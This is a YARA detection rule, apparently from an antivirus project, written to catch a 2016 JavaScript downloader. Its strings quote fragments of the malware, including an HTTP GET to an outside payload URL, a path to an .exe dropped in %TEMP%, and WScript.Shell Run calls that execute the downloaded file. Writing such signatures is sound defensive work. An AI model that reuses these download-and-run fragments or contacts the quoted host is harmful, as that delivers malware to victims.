rule sig_20160329_01eec30b92aa8a8a615368ea52258d97 {
  meta:
    description = "datamaliciousorder - file 20160329_01eec30b92aa8a8a615368ea52258d97.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2012c1c883fc1837045ed8b5dd787fb2a3c066574f0a370c508d193d65e3e56a"

  strings:
    $s1  = "CD[iV](\"GET\", \"http://www.the2ndedit.com/j1oisa\", false);" fullword ascii
    $s2  = "function P() {return U[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"283pveAka6.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[K](O() * 11); if (CD[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Ch(VR, W){oq = oq * 1; return VR - W;};" fullword ascii
    $s5  = "var U = function L() {return WScript[M](\"WScript.Shell\");}(), jS = 11;" fullword ascii
    $s6  = "function B(){return \"\" + A;};" fullword ascii
    $s7  = "function n() {return ((D == true) && (D == a)) ? 1 : oq;};" fullword ascii
    $s8  = "function N(sD){U[\"Run\"](sD, oq, oq);};" fullword ascii
    $s9  = "return Ch(x, us);" fullword ascii
    $s10 = "var e = new this[\"Date\"]();" fullword ascii
    $s11 = "function p()" fullword ascii
    $s12 = "function pw(ah) {var F = (1, 2, 3, 4, 5, ah); return F;};" fullword ascii
    $s13 = "function O(){return 22;};" fullword ascii
    $s14 = "function eC(){return M;};" fullword ascii
    $s15 = " while (ao){" fullword ascii
    $s16 = "var a = false;" fullword ascii
    $s17 = "a = true; " fullword ascii
    $s18 = "var WP = false;" fullword ascii
    $s19 = "} catch(HV){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}